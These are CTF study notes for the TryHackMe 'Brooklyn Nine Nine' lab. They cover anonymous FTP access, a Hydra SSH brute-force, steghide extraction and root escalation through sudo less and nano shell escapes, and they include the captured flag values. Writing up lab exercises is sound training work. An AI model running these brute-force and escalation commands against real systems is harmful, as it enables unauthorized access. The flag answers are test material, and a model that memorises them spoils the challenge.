# Brooklyn Nine Nine — CTF Study Notes

**Platform:** TryHackMe
**Difficulty:** Easy / Beginner
**Machine type:** Boot-to-root
**Open ports:** 21 (FTP), 22 (SSH), 80 (HTTP)

---

## Flags captured

| Flag | Value | Location |
|------|-------|----------|
| User | `ee11cbb19052e40b07aac0ca060c23ee` | `/home/holt/user.txt` |
| Root | `63a9f0ea7bb98050796b649e85481845` | `/root/root.txt` |

> Note: the user flag `ee11cbb1...` is the MD5 hash of the string `password`. A nice reminder that many CTF flags are just hashes of common words.

---

## The big picture

The room offers **two intended paths to a foothold**, both landing on a low-privileged user who can then escalate to root via a misconfigured `sudo` rule. The key idea is that different footholds lead to different escalation binaries, both classic GTFOBins tricks.

```
                        ┌─ Path A: FTP note → hint that jake's
                        │           password is weak → brute-force
                        │           SSH → shell as jake
   Recon (nmap)  ───────┤                                          ──► sudo -l  ──►  root
                        │
                        └─ Path B: steghide on brooklyn99.jpg →
                                    creds hidden in the image →
                                    shell as another user
```

You solved it via **Path A**.

---

## Step-by-step walkthrough (Path A — the one you did)

### 1. Recon

```bash
nmap -sC -sV -oN nmap_initial 10.130.143.4
```

Found ports 21 (FTP, anonymous allowed), 22 (SSH), 80 (HTTP).

- Port 80 served a Brooklyn Nine-Nine themed page (a rabbit hole / flavor; the real clue was hinted in the page source and the downloadable image).
- Port 21 allowed **anonymous login** — the actual starting point.

### 2. Anonymous FTP

```bash
ftp 10.130.143.4
# Name: anonymous
# Password: (blank — just press Enter)
ls
get note_to_jake.txt
exit
```

Key lesson learned: **`cat` is not an FTP command.** You download the file with `get`, then read it *after leaving* the FTP client with regular shell tools.

```bash
cat note_to_jake.txt
```

Contents:

> From Amy,
> Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

**Takeaway:** username = `jake`, and the password is weak → brute-forceable.

### 3. Brute-force SSH with Hydra

```bash
# If rockyou is still gzipped on your Kali:
gunzip /usr/share/wordlists/rockyou.txt.gz

hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.130.143.4 ssh
```

Result:

```
[22][ssh] host: 10.130.143.4  login: jake  password: 987654321
```

Tip: if SSH throws "child died" errors, throttle threads with `-t 4`.

### 4. SSH in and enumerate

```bash
ssh jake@10.130.143.4     # password: 987654321

ls -la               # home dir — note .sudo_as_admin_successful marker
ls -la /home         # discover users: amy, holt, jake (all world-readable)
cat /home/holt/user.txt   # → user flag
```

### 5. Privilege escalation via sudo + less (GTFOBins)

```bash
sudo -l
```

Output:

```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

`less` can be run as root with **no password**. `less` lets you shell out from inside the pager, and that shell inherits root:

```bash
sudo less /etc/profile
# then, inside the less pager, type:
!/bin/bash
```

Confirm and grab the flag:

```bash
whoami            # root
cat /root/root.txt
```

---

## Alternate foothold (Path B — steghide)

The `brooklyn99.jpg` image downloaded from the web server hides data with **steghide**, not EXIF.

Important lesson: **`exiftool` shows nothing useful here** — those were just standard JPEG headers. Steganography ≠ metadata. Reach for steghide (or `stegseek`) when a challenge hands you an image and EXIF is empty.

```bash
steghide extract -sf brooklyn99.jpg
# press Enter at the passphrase prompt (empty passphrase)
cat *.txt
```

This reveals another user's credentials directly. SSH in as that user, then `sudo -l` shows they can run **`nano`** as root:

```bash
sudo nano
# inside nano:  Ctrl+R  then  Ctrl+X
# then run:     reset; sh 1>&0 2>&0
```

Same destination (root), different binary.

---

## Key tools & techniques to remember

| Tool | Purpose | Key usage |
|------|---------|-----------|
| `nmap -sC -sV` | Service + version recon | Always your first move |
| `ftp` / `wget -r ftp://...` | Anonymous FTP access | `get` to download; read files *outside* the client |
| `hydra` | Online password brute-force | `-l user -P wordlist target ssh`; add `-t 4` if SSH errors |
| `steghide extract -sf file` | Pull hidden data from images | Try empty passphrase first |
| `sudo -l` | Enumerate sudo privileges | **First thing to run after any foothold** |
| GTFOBins | Escalation via allowed binaries | Look up whatever `sudo -l` reveals |

---

## Transferable lessons

1. **Filenames matter.** `note.txt` didn't exist — the real file was `note_to_jake.txt`. Always `ls` before you `get`.
2. **Know your client's command set.** Inside `ftp`, only FTP commands work. Download, then read locally.
3. **EXIF is not steganography.** Empty EXIF doesn't mean the image is clean — try steghide/stegseek.
4. **`sudo -l` is the single highest-value privesc check.** Run it immediately after every foothold.
5. **GTFOBins is your escalation cheat sheet.** Any binary you can run as root/sudo — check https://gtfobins.github.io first. `less`, `nano`, `vim`, `find`, `awk`, and many others all have well-known escapes.
6. **Notes/hints in a box are deliberate.** A "please change your password" note is the author pointing you at a brute-force.

---

## GTFOBins escapes seen in this room (for reference)

**`less` (sudo):**
```
sudo less /etc/profile
!/bin/bash
```

**`nano` (sudo):**
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

---

*Room created by Fsociety2006. Notes compiled after a successful root.*
